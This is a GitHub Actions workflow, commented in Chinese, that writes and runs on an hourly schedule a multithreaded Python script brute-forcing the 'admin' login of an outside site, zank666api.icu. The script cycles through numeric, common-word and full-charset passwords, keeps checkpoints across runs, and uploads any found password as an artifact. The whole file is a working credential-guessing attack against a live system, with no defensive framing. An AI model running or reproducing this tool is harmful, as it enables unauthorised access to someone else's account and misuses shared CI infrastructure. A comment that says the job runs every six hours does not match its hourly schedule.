name: Password Brute Force Complete

on:
  workflow_dispatch:  # 允许手动触发
  schedule:
    - cron: '0 */1 * * *'  # 每6小时运行一次

jobs:
  brute-force:
    runs-on: ubuntu-latest
    timeout-minutes: 280  # 接近GitHub的6小时限制
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install requests tqdm

    - name: Create brute force script
      run: |
        cat > brute_force.py << 'EOF'
        import random
        import string
        import requests
        import json
        import time
        import os
        import itertools
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from tqdm import tqdm

        # 所有可能的字符集
        ALL_CHARS = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"

        # 密码生成器 - 按长度顺序生成
        def password_generator(min_length=6, max_length=10):
            for length in range(min_length, max_length + 1):
                print(f"开始生成长度为 {length} 的密码...")
                total_combinations = len(ALL_CHARS) ** length
                print(f"长度 {length} 的密码总数: {total_combinations:,}")
                
                # 使用迭代器生成密码，避免内存爆炸
                for chars in itertools.product(ALL_CHARS, repeat=length):
                    yield ''.join(chars)

        # 从检查点恢复
        def get_checkpoint():
            if os.path.exists("checkpoint.txt"):
                with open("checkpoint.txt", "r") as f:
                    return f.read().strip()
            return None

        # 保存检查点
        def save_checkpoint(password):
            with open("checkpoint.txt", "w") as f:
                f.write(password)

        # 尝试登录的函数
        def try_login(password, attempt, total_attempts):
            url = "https://zank666api.icu/proxy/api/back/back-user/login"
            
            headers = {
                "Host": "zank666api.icu",
                "Content-Type": "application/json;charset=utf-8",
                "Origin": "https://zank666api.icu",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
                "Referer": "https://zank666api.icu/",
                "Accept-Language": "zh-CN,zh-Hans;q=0.9"
            }
            
            data = {
                "password": password,
                "userName": "admin"
            }

            try:
                # 添加延迟，避免请求过于频繁
                time.sleep(0.5)
                
                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=15)
                
                # 记录尝试
                with open("attempt_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - {response.status_code}\n")

                # 成功判断条件
                if response.status_code == 200:
                    try:
                        response_data = response.json()
                        success_conditions = [
                            response_data.get("code") == 200,
                            "token" in str(response_data).lower(),
                            "success" in str(response_data).lower(),
                            "成功" in str(response_data)
                        ]
                        if any(success_conditions):
                            print(f"✅ 登录成功! 密码是: {password}")
                            print(f"响应内容: {response.text}")
                            with open("password.txt", "w") as f:
                                f.write(password)
                            with open("success_log.txt", "a") as f:
                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - 成功密码: {password}\n")
                            return True, password
                    except json.JSONDecodeError:
                        if "成功" in response.text or "token" in response.text.lower():
                            print(f"✅ 登录成功! 密码是: {password}")
                            with open("password.txt", "w") as f:
                                f.write(password)
                            return True, password
                
                if attempt % 100 == 0:
                    print(f"[{attempt}/{total_attempts}] 尝试密码: {password} | 状态码: {response.status_code}")
                
                return False, None

            except requests.exceptions.RequestException as e:
                print(f"[{attempt}/{total_attempts}] 请求错误: {e}")
                with open("error_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - 错误: {e}\n")
                return False, None

        # 智能密码生成策略（避免生成所有组合）
        def smart_password_generator():
            # 先尝试常见模式
            common_patterns = [
                # 纯数字
                *[str(i).zfill(length) for length in range(6, 11) for i in range(10**length)],
                
                # 字母+数字组合
                *['admin' + str(i).zfill(2) for i in range(100)],
                *['Admin' + str(i).zfill(2) for i in range(100)],
                *['password' + str(i).zfill(2) for i in range(100)],
                
                # 常见单词+数字
                *[word + str(i) for word in ['test', 'user', 'login', 'pass', 'secret'] for i in range(1000)],
                
                # 特殊字符组合
                *['!'*length for length in range(6, 11)],
                *['@'*length for length in range(6, 11)],
                *['#'*length for length in range(6, 11)],
            ]
            
            for pattern in common_patterns:
                if 6 <= len(pattern) <= 10:
                    yield pattern
            
            # 然后按长度顺序生成所有组合
            for length in range(6, 11):
                print(f"开始生成长度为 {length} 的所有组合...")
                # 使用更高效的方式生成，避免内存问题
                for i in range(len(ALL_CHARS) ** length):
                    chars = []
                    n = i
                    for _ in range(length):
                        chars.append(ALL_CHARS[n % len(ALL_CHARS)])
                        n //= len(ALL_CHARS)
                    yield ''.join(chars)

        def main():
            print("开始完整密码空间爆破...")
            print(f"字符集: {ALL_CHARS}")
            print(f"字符集大小: {len(ALL_CHARS)}")
            print("=" * 60)
            
            # 从检查点恢复
            checkpoint = get_checkpoint()
            start_from_checkpoint = checkpoint is not None
            
            if start_from_checkpoint:
                print(f"从检查点恢复: {checkpoint}")
            else:
                print("开始新的爆破会话")
            
            # 多线程处理
            max_workers = 8
            found = False
            correct_password = None
            attempt_count = 0
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                password_gen = smart_password_generator()
                
                # 跳过已尝试的密码
                if start_from_checkpoint:
                    skipping = True
                    for password in password_gen:
                        if skipping:
                            if password == checkpoint:
                                skipping = False
                                print(f"找到检查点，开始从下一个密码尝试")
                            continue
                        break
                
                try:
                    with tqdm(desc="尝试密码", unit="pwd") as pbar:
                        while not found:
                            # 提交新任务
                            while len(futures) < max_workers * 2 and not found:
                                try:
                                    password = next(password_gen)
                                    attempt_count += 1
                                    
                                    future = executor.submit(try_login, password, attempt_count, "many")
                                    futures[future] = (password, attempt_count)
                                    
                                    # 每1000次保存检查点
                                    if attempt_count % 1000 == 0:
                                        save_checkpoint(password)
                                        pbar.set_description(f"尝试密码: {password[:10]}...")
                                        pbar.update(1000)
                                    
                                except StopIteration:
                                    print("所有密码组合已尝试完毕")
                                    break
                            
                            # 检查完成的任务
                            for future in list(futures.keys()):
                                if future.done():
                                    password, count = futures[future]
                                    del futures[future]
                                    
                                    try:
                                        success, result_password = future.result()
                                        if success:
                                            found = True
                                            correct_password = result_password
                                            break
                                    except Exception as e:
                                        print(f"任务异常: {e}")
                            
                            if not futures:  # 所有任务都完成了
                                break
                                
                            time.sleep(0.1)
                
                except KeyboardInterrupt:
                    print("用户中断")
                finally:
                    # 取消所有未完成的任务
                    for future in futures:
                        future.cancel()
            
            return found, correct_password

        if __name__ == "__main__":
            start_time = time.time()
            found, password = main()
            end_time = time.time()
            
            print("=" * 60)
            if found:
                print(f"🎉 爆破成功! 密码是: {password}")
                print(f"总耗时: {end_time - start_time:.2f} 秒")
            else:
                print("❌ 爆破失败，未找到正确密码")
                print(f"总尝试时间: {end_time - start_time:.2f} 秒")
        EOF

    - name: Run brute force
      run: |
        # 创建必要的日志文件
        touch attempt_log.txt error_log.txt
        # 运行爆破脚本
        timeout 275m python brute_force.py || echo "运行超时或中断"

    - name: Check if password found
      id: check_password
      run: |
        if [ -f "password.txt" ]; then
          echo "PASSWORD_FOUND=true" >> $GITHUB_OUTPUT
          echo "密码已找到: $(cat password.txt)"
          echo "🎉 密码爆破成功! 密码: $(cat password.txt)" >> $GITHUB_STEP_SUMMARY
        else
          echo "PASSWORD_FOUND=false" >> $GITHUB_OUTPUT
          echo "本轮未找到密码"
          echo "📊 本轮运行完成，继续下一轮..." >> $GITHUB_STEP_SUMMARY
          # 显示检查点信息
          if [ -f "checkpoint.txt" ]; then
            echo "检查点: $(cat checkpoint.txt)" >> $GITHUB_STEP_SUMMARY
          fi
        fi

    - name: Upload results
      uses: actions/upload-artifact@v4
      with:
        name: brute-force-results
        path: |
          password.txt
          success_log.txt
          attempt_log.txt
          error_log.txt
          checkpoint.txt
        if-no-files-found: ignore

    - name: Send summary
      run: |
        echo "运行完成时间: $(date)" >> $GITHUB_STEP_SUMMARY
        if [ -f "attempt_log.txt" ]; then
          echo "尝试次数: $(wc -l < attempt_log.txt)" >> $GITHUB_STEP_SUMMARY
        fi